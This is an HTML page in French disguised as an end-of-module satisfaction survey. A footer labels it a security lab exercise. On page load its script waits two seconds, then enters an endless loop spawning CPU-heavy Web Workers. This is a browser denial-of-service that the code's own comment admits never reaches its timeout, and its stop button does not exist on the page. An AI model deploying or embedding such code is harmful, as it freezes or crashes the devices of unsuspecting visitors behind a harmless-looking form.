<!doctype html>
<html lang="fr">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <title>Questionnaire de satisfaction</title>
    <style>
        body{font-family:Arial,Helvetica,sans-serif;background:#2a0f3a;color:#fff;margin:0;padding:0}
        .container{max-width:900px;margin:20px auto;padding:20px}
        header{background:#2b0f42;padding:20px;text-align:center}
        header img{height:40px}
        .card{background:#251033;padding:20px;border:6px solid #2b0f42}
        label{display:block;margin:10px 0}
        input[type=text], input[type=email], textarea{width:100%;padding:8px;border:1px solid #ddd}
        .row{display:flex;gap:10px}
        .col{flex:1}
        .radios{padding:10px 0}
        .submit{display:block;margin:20px auto;padding:10px 20px;background:#fff;color:#251033;border:none;cursor:pointer}
        footer{font-size:12px;text-align:center;margin-top:10px;color:#ccc}
        #log{background:#1b0620;padding:10px;margin:10px 0;font-family:monospace;font-size:12px;max-height:150px;overflow-y:auto}
        .controls{text-align:center;margin:10px 0}
        .btn{padding:8px 16px;margin:5px;cursor:pointer;border:none;background:#fff;color:#251033}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="epsi.png" alt="epsi logo"/>
            <h1>Questionnaire de satisfaction fin de module</h1>
        </header>

        <div class="card">
            
            

            <form id="survey">
                <fieldset>
                    <legend>Civilité</legend>
                    <div class="radios">
                        <label><input type="radio" name="civilite" value="mr"/> Mr</label>
                        <label><input type="radio" name="civilite" value="mme"/> Mme</label>
                    </div>
                </fieldset>

                <label>Nom: <input name="nom" type="text" placeholder="Entrez votre réponse"/></label>
                <label>Prénom: <input name="prenom" type="text" placeholder="Entrez votre réponse"/></label>
                <label>Email: <input name="email" type="email" placeholder="Entrez votre réponse"/></label>

                <label>Satisfaction générale:
                    <div style="background:#1b0620;padding:10px;color:#ddd">(questions...) </div>
                </label>

                <label>Souhaitez-vous apporter des précisions ?
                    <textarea name="comment" rows="4" placeholder="Entrez votre réponse"></textarea>
                </label>

                <button class="submit" type="submit">Envoyer</button>
            </form>
        </div>

        <footer>© Exemple - TP sécurité</footer>
    </div>

    <script>
      const log = msg => {
        const p = document.getElementById('log');
        if (p) {
          p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
        }
      };

      let workers = [];
      const duration = 30000; // 30 secondes de simulation

      function makeWorkerScript() {
        return `
          let stopped = false;
          onmessage = e => { if (e.data === 'stop') stopped = true; };
          function busyChunk(iter) {
            let x = 0;
            for (let i = 0; i < iter; i++) x += Math.sqrt(i);
            return x;
          }
          (async function loop() {
            const CHUNK = 20000;
            const INTERVAL_MS = 10;
            while (!stopped) {
              busyChunk(CHUNK);
              await new Promise(r => setTimeout(r, INTERVAL_MS));
              postMessage({ tick: Date.now() });
            }
            postMessage({ stopped: true });
          })();
        `;
      }

      function startSimulation() {
        log('Démarrage de la simulation...');
        stopWorkers();
        
        const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);

        // Création infinie de workers (boucle bloquante)
        while(true) {
          const w = new Worker(url);
          w.onmessage = () => {};
          workers.push(w);
        }

        // Ce code ne sera jamais atteint à cause du while(true)
        setTimeout(() => {
          stopWorkers();
          URL.revokeObjectURL(url);
          log('Simulation terminée automatiquement');
        }, duration);
      }

      function stopWorkers() {
        if (workers.length === 0) return;
        log('Arrêt des workers...');
        for (const w of workers) {
          try { w.postMessage('stop'); } catch(e) {}
          try { w.terminate(); } catch(e) {}
        }
        workers = [];
      }

      // Lancement automatique au chargement de la page
      document.addEventListener('DOMContentLoaded', () => {
        log('Page chargée - démarrage dans 2 secondes...');
        setTimeout(() => {
          startSimulation();
        }, 2000);
      });

      // Bouton d'arrêt manuel
      document.getElementById('stop').addEventListener('click', () => {
        stopWorkers();
        log('Arrêt manuel demandé');
      });
    </script>
</body>
</html>